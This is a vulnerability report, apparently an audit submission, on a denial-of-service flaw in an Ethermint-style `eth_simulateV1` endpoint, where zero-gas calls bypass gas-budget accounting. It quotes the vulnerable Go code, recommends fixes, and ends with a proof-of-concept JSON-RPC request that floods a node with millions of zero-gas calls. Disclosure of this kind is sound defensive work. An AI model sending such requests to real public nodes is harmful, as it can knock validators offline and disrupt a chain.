### Title
Unbounded Zero-Gas Calls in `eth_simulateV1` Bypass Gas Budget, Enabling JSON-RPC Node DoS - (File: `x/evm/keeper/simulate.go`)

### Summary

The `eth_simulateV1` JSON-RPC endpoint (`PublicAPI.SimulateV1`) imposes no upper bound on the number of calls per simulated block (`SimBlock.Calls`). When a caller supplies calls with an explicit `gas = 0`, the `sanitizeCall` function passes both the per-block gas limit check and the cross-block `GasBudget` check without consuming any budget. Each zero-gas call still traverses the full EVM processing pipeline (JSON unmarshal, nonce lookup, EVM context setup, `applyCall`), so an attacker can submit a single request containing 256 blocks each with an arbitrarily large number of zero-gas calls, causing unbounded CPU and memory consumption in the JSON-RPC server.

### Finding Description

**Entry point** — `eth_simulateV1` is exposed as a public, unauthenticated JSON-RPC method:

```go
// rpc/namespaces/ethereum/eth/api.go
func (e *PublicAPI) SimulateV1(opts rpctypes.SimOpts, ...) (json.RawMessage, error) {
```

**Block-count guard** — The backend and the keeper both check `len(BlockStateCalls) > MaxSimulateBlocks` (256), but there is **no corresponding limit on `SimBlock.Calls`**:

```go
// rpc/types/simulate.go:46-50
type SimBlock struct {
    BlockOverrides *SimBlockOverrides `json:"blockOverrides"`
    StateOverrides *SimStateOverride  `json:"stateOverrides"`
    Calls          []json.RawMessage  `json:"calls"`   // ← no length cap
}
```

**Zero-gas bypass in `sanitizeCall`** — When a call carries `gas = 0`, the per-block gas check `*remainingBlockGas < uint64(*call.Gas)` evaluates to `N < 0` on unsigned integers, which is always `false`, so the check is silently skipped. The cross-block budget cap then returns 0:

```go
// x/evm/keeper/simulate.go:518-529
if *remainingBlockGas < uint64(*call.Gas) {   // false when call.Gas == 0
    return &rpctypes.BlockGasLimitReachedError{...}
}
gas := sim.budget.Cap(uint64(*call.Gas))       // Cap(0) == 0
call.Gas = (*hexutil.Uint64)(&gas)
```

**Budget never consumed** — Back in `processBlock`, a 0-gas call returns `gasUsed = 0` (the EVM immediately fails with out-of-gas but consumed nothing), so neither `remainingBlockGas` nor the `GasBudget` is decremented:

```go
// x/evm/keeper/simulate.go:216-223
gasUsed := result.GasUsed          // == 0
remainingBlockGas -= gasUsed       // unchanged
if err := sim.budget.Consume(gasUsed); err != nil {  // Consume(0) → no error
    return nil, nil, nil, err
}
```

The loop over `block.Calls` therefore iterates indefinitely, executing the full EVM pipeline for every entry.

### Impact Explanation

An unprivileged caller can submit a single `eth_simulateV1` request with 256 blocks (the maximum), each containing an arbitrarily large slice of zero-gas calls. Every call incurs JSON unmarshalling, nonce lookup via `state.GetNonce`, EVM context construction, and `applyCall` execution — all without decrementing any budget counter. This causes unbounded CPU and memory consumption inside the gRPC query handler, which runs in the same process as the validator node. Sustained or concurrent requests can exhaust node resources, making the node unable to participate in consensus (block proposal/voting), satisfying the "halt the chain" or "reachable route to the impacts above" criterion for a High/Critical finding.

### Likelihood Explanation

`eth_simulateV1` is a public, unauthenticated JSON-RPC endpoint. No funds, keys, or special roles are required. The attack payload is a single well-formed JSON request. Default Ethermint deployments expose this endpoint on port 8545. The only partial mitigation is the per-request `RPCEVMTimeout`, but an attacker can issue many concurrent requests to saturate the node before any individual timeout fires.

### Recommendation

1. **Cap calls per block**: Enforce a maximum on `len(block.Calls)` in `sanitizeCall` or at the start of `processBlock`, analogous to the `MaxSimulateBlocks` guard on block count.
2. **Reject zero-gas calls**: In `sanitizeCall`, return an error when `*call.Gas == 0` (after the `nil` default-fill path), preventing calls that consume no budget from entering the processing loop.
3. **Count calls against the budget before execution**: Charge a minimum fixed overhead (e.g., intrinsic gas floor) per call against `GasBudget` regardless of the call's declared gas, so the budget is always decremented.

### Proof of Concept

```json
{
  "jsonrpc": "2.0",
  "method": "eth_simulateV1",
  "params": [
    {
      "blockStateCalls": [
        {
          "calls": [
            { "from": "0x0000000000000000000000000000000000000001",
              "to":   "0x0000000000000000000000000000000000000002",
              "gas":  "0x0" },
            // ... repeat 10_000_000 times ...
          ]
        }
      ]
    },
    "latest"
  ],
  "id": 1
}
```

Each entry passes `sanitizeCall` (gas=0 bypasses the uint64 underflow check), `budget.Cap(0)` returns 0, `budget.Consume(0)` succeeds, and `remainingBlockGas` is never decremented. The server iterates all 10 million entries through the full EVM pipeline, exhausting CPU and memory.

```go
// NewGasBudget creates a gas budget with the given cap. A cap of 0 is unlimited.
func NewGasBudget(gasCap uint64) *GasBudget {
	if gasCap == 0 {
		gasCap = math.MaxUint64
	}
	return &GasBudget{remaining: gasCap}
}

// Cap returns the given gas value clamped to the remaining budget.
func (b *GasBudget) Cap(gas uint64) uint64 {
	if gas > b.remaining {
		return b.remaining
	}
	return gas
}

// Consume deducts the given amount from the budget.
func (b *GasBudget) Consume(amount uint64) error {
	if amount > b.remaining {
		return fmt.Errorf("RPC gas cap exhausted: need %d, remaining %d", amount, b.remaining)
	}
	b.remaining -= amount
	return nil
```

```go
func (sim *Simulator) sanitizeCall(call *evmtypes.TransactionArgs, state *statedb.StateDB, header *ethtypes.Header, remainingBlockGas *uint64) error {
	if call.Nonce == nil {
		nonce := state.GetNonce(call.GetFrom())
		call.Nonce = (*hexutil.Uint64)(&nonce)
	}
	// Let the call run wild unless explicitly specified.
	if call.Gas == nil {
		call.Gas = (*hexutil.Uint64)(remainingBlockGas)
	}
	if *remainingBlockGas < uint64(*call.Gas) {
		return &rpctypes.BlockGasLimitReachedError{
			Message: fmt.Sprintf(
				"block gas limit reached: remaining: %d, required: %d",
				*remainingBlockGas,
				*call.Gas,
			),
		}
	}
	// Clamp to the cross-block gas budget.
	gas := sim.budget.Cap(uint64(*call.Gas))
	call.Gas = (*hexutil.Uint64)(&gas)

	return call.CallDefaults(0, header.BaseFee, sim.chainConfig.ChainID)
}
```

```go
func (k Keeper) SimulateV1(c context.Context, req *types.SimulateV1Request) (*types.SimulateV1Response, error) {
	if req == nil {
		return nil, status.Error(codes.InvalidArgument, "empty request")
	}

	ctx := sdk.UnwrapSDKContext(c)
	ctx = ctx.WithProposer(GetProposerAddress(ctx, req.ProposerAddress))

	var payload rpctypes.SimulateV1Args
	if err := json.Unmarshal(req.Args, &payload); err != nil {
		return nil, status.Error(codes.InvalidArgument, err.Error())
	}

	if payload.BaseHeader == nil {
		return nil, status.Error(codes.InvalidArgument, "missing base header")
	}

	if len(payload.Opts.BlockStateCalls) == 0 {
		return nil, status.Error(codes.InvalidArgument, "blockStateCalls must not be empty")
	}
	if len(payload.Opts.BlockStateCalls) > rpctypes.MaxSimulateBlocks {
		return nil, status.Error(codes.InvalidArgument, "too many blocks in blockStateCalls")
```
